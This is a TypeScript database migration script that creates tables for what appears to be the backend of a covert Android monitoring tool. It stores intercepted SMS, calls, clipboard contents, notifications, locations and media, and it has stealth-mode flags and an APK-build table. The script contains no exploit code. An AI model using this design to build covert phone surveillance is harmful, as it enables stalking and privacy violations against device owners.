/**
 * TiDB Cloud Migration Script
 * Runs all CREATE TABLE statements directly via mysql2.
 * Safe to run multiple times (uses IF NOT EXISTS).
 */
import "dotenv/config";
import mysql from "mysql2/promise";

const DATABASE_URL = process.env.DATABASE_URL;
if (!DATABASE_URL) {
  console.error("❌ DATABASE_URL is not set in .env");
  process.exit(1);
}

const statements = [
  // ──────────────────────────────────────────────
  // USERS (already exists, but we add missing cols)
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`users\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`openId\` varchar(64) NOT NULL,
    \`name\` text,
    \`email\` varchar(320),
    \`loginMethod\` varchar(64),
    \`role\` enum('admin','manager','user','viewer') NOT NULL DEFAULT 'viewer',
    \`twoFactorEnabled\` boolean NOT NULL DEFAULT false,
    \`twoFactorSecret\` varchar(255),
    \`passwordHash\` varchar(255),
    \`isActive\` boolean NOT NULL DEFAULT true,
    \`lastSignedIn\` timestamp NULL,
    \`createdAt\` timestamp NOT NULL DEFAULT (now()),
    \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
    CONSTRAINT \`users_id\` PRIMARY KEY(\`id\`),
    CONSTRAINT \`users_openId_unique\` UNIQUE(\`openId\`)
  )`,

  // ──────────────────────────────────────────────
  // PERMISSIONS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`permissions\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`code\` varchar(64) NOT NULL,
    \`name\` varchar(255) NOT NULL,
    \`description\` text,
    \`category\` varchar(64) NOT NULL,
    \`createdAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`permissions_id\` PRIMARY KEY(\`id\`),
    CONSTRAINT \`permissions_code_unique\` UNIQUE(\`code\`)
  )`,

  // ──────────────────────────────────────────────
  // USER PERMISSIONS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`userPermissions\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`userId\` int NOT NULL,
    \`permissionId\` int NOT NULL,
    \`grantedAt\` timestamp NOT NULL DEFAULT (now()),
    \`grantedBy\` int,
    CONSTRAINT \`userPermissions_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // DEVICES
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`devices\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` varchar(255) NOT NULL,
    \`deviceName\` varchar(255) NOT NULL,
    \`manufacturer\` varchar(255),
    \`model\` varchar(255),
    \`androidVersion\` varchar(64),
    \`imei\` varchar(64),
    \`phoneNumber\` varchar(20),
    \`ownerId\` int NOT NULL,
    \`status\` enum('online','offline','inactive') NOT NULL DEFAULT 'offline',
    \`lastSeen\` timestamp NULL,
    \`isStealthMode\` boolean NOT NULL DEFAULT false,
    \`batteryLevel\` int,
    \`storageUsed\` bigint,
    \`storageTotal\` bigint,
    \`metadata\` json,
    \`createdAt\` timestamp NOT NULL DEFAULT (now()),
    \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
    CONSTRAINT \`devices_id\` PRIMARY KEY(\`id\`),
    CONSTRAINT \`devices_deviceId_unique\` UNIQUE(\`deviceId\`),
    CONSTRAINT \`devices_imei_unique\` UNIQUE(\`imei\`)
  )`,

  // ──────────────────────────────────────────────
  // DEVICE PERMISSIONS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`devicePermissions\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`userId\` int NOT NULL,
    \`permissionId\` int NOT NULL,
    \`grantedAt\` timestamp NOT NULL DEFAULT (now()),
    \`grantedBy\` int,
    CONSTRAINT \`devicePermissions_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // LOCATION HISTORY
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`locationHistory\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`latitude\` decimal(10,8) NOT NULL,
    \`longitude\` decimal(11,8) NOT NULL,
    \`accuracy\` decimal(10,2),
    \`altitude\` decimal(10,2),
    \`speed\` decimal(10,2),
    \`bearing\` decimal(10,2),
    \`provider\` varchar(64),
    \`address\` text,
    \`timestamp\` timestamp NOT NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`locationHistory_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // SMS LOGS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`smsLogs\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`phoneNumber\` varchar(20) NOT NULL,
    \`messageBody\` text NOT NULL,
    \`direction\` enum('incoming','outgoing') NOT NULL,
    \`timestamp\` timestamp NOT NULL,
    \`isRead\` boolean NOT NULL DEFAULT false,
    \`threadId\` varchar(64),
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`smsLogs_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // CALL LOGS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`callLogs\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`phoneNumber\` varchar(20) NOT NULL,
    \`contactName\` varchar(255),
    \`callType\` enum('incoming','outgoing','missed') NOT NULL,
    \`duration\` int NOT NULL,
    \`timestamp\` timestamp NOT NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`callLogs_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // CONTACTS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`contacts\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`name\` varchar(255) NOT NULL,
    \`phoneNumber\` varchar(20),
    \`email\` varchar(320),
    \`photoUrl\` text,
    \`notes\` text,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`contacts_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // INSTALLED APPS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`installedApps\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`packageName\` varchar(255) NOT NULL,
    \`appName\` varchar(255) NOT NULL,
    \`version\` varchar(64),
    \`versionCode\` int,
    \`isSystemApp\` boolean NOT NULL DEFAULT false,
    \`installTime\` timestamp NULL,
    \`updateTime\` timestamp NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`installedApps_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // CLIPBOARD LOGS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`clipboardLogs\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`content\` text NOT NULL,
    \`contentType\` varchar(64),
    \`timestamp\` timestamp NOT NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`clipboardLogs_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // NOTIFICATION LOGS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`notificationLogs\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`appName\` varchar(255) NOT NULL,
    \`title\` varchar(255),
    \`body\` text,
    \`timestamp\` timestamp NOT NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`notificationLogs_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // MEDIA FILES
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`mediaFiles\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`fileType\` enum('screenshot','video','audio','photo') NOT NULL,
    \`fileName\` varchar(255) NOT NULL,
    \`fileUrl\` text NOT NULL,
    \`fileSize\` bigint,
    \`duration\` int,
    \`timestamp\` timestamp NOT NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`mediaFiles_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // AUDIT LOGS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`auditLogs\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`userId\` int,
    \`deviceId\` int,
    \`action\` varchar(255) NOT NULL,
    \`actionType\` enum('user_login','user_logout','user_created','user_updated','user_deleted','permission_granted','permission_revoked','device_added','device_removed','device_monitored','data_accessed','data_exported','settings_changed','security_event') NOT NULL,
    \`resourceType\` varchar(64),
    \`resourceId\` varchar(255),
    \`details\` json,
    \`ipAddress\` varchar(45),
    \`userAgent\` text,
    \`status\` enum('success','failure') NOT NULL DEFAULT 'success',
    \`timestamp\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`auditLogs_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // APK BUILDS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`apkBuilds\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`buildId\` varchar(64) NOT NULL,
    \`createdBy\` int NOT NULL,
    \`appName\` varchar(255) NOT NULL,
    \`packageName\` varchar(255) NOT NULL,
    \`versionName\` varchar(64),
    \`versionCode\` int,
    \`iconUrl\` text,
    \`stealthMode\` boolean NOT NULL DEFAULT false,
    \`ports\` json,
    \`sslEnabled\` boolean NOT NULL DEFAULT true,
    \`serverUrl\` text,
    \`apkUrl\` text,
    \`fileSize\` bigint,
    \`status\` enum('building','ready','failed','expired') NOT NULL DEFAULT 'building',
    \`downloadCount\` int NOT NULL DEFAULT 0,
    \`expiresAt\` timestamp NULL,
    \`createdAt\` timestamp NOT NULL DEFAULT (now()),
    \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
    CONSTRAINT \`apkBuilds_id\` PRIMARY KEY(\`id\`),
    CONSTRAINT \`apkBuilds_buildId_unique\` UNIQUE(\`buildId\`)
  )`,

  // ──────────────────────────────────────────────
  // GEOFENCES
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`geofences\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`deviceId\` int NOT NULL,
    \`name\` varchar(255) NOT NULL,
    \`latitude\` decimal(10,8) NOT NULL,
    \`longitude\` decimal(11,8) NOT NULL,
    \`radius\` decimal(10,2) NOT NULL,
    \`isActive\` boolean NOT NULL DEFAULT true,
    \`alertOnEntry\` boolean NOT NULL DEFAULT true,
    \`alertOnExit\` boolean NOT NULL DEFAULT true,
    \`createdAt\` timestamp NOT NULL DEFAULT (now()),
    \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
    CONSTRAINT \`geofences_id\` PRIMARY KEY(\`id\`)
  )`,

  // ──────────────────────────────────────────────
  // GEOFENCE EVENTS
  // ──────────────────────────────────────────────
  `CREATE TABLE IF NOT EXISTS \`geofenceEvents\` (
    \`id\` int AUTO_INCREMENT NOT NULL,
    \`geofenceId\` int NOT NULL,
    \`deviceId\` int NOT NULL,
    \`eventType\` enum('entry','exit') NOT NULL,
    \`latitude\` decimal(10,8),
    \`longitude\` decimal(11,8),
    \`timestamp\` timestamp NOT NULL,
    \`recordedAt\` timestamp NOT NULL DEFAULT (now()),
    CONSTRAINT \`geofenceEvents_id\` PRIMARY KEY(\`id\`)
  )`,
];

async function migrate() {
  console.log("🔗 Connecting to TiDB Cloud...");
  const conn = await mysql.createConnection({
    uri: DATABASE_URL,
    ssl: { rejectUnauthorized: true },
  });

  console.log("✅ Connected. Running migrations...\n");
  let success = 0;
  let skipped = 0;
  let failed = 0;

  for (const stmt of statements) {
    // Extract table name for logging
    const match = stmt.match(/CREATE TABLE IF NOT EXISTS `(\w+)`/);
    const tableName = match ? match[1] : "unknown";

    try {
      await conn.execute(stmt);
      console.log(`  ✅ ${tableName}`);
      success++;
    } catch (err: any) {
      if (err.errno === 1050) {
        // Table already exists - not an error in our case
        console.log(`  ⏭️  ${tableName} (already exists)`);
        skipped++;
      } else {
        console.error(`  ❌ ${tableName}: ${err.message}`);
        failed++;
      }
    }
  }

  await conn.end();

  console.log(`\n──────────────────────────────`);
  console.log(`✅ Created:  ${success}`);
  console.log(`⏭️  Skipped:  ${skipped}`);
  console.log(`❌ Failed:   ${failed}`);

  if (failed > 0) process.exit(1);
}

migrate().catch((err) => {
  console.error("Fatal error:", err);
  process.exit(1);
});
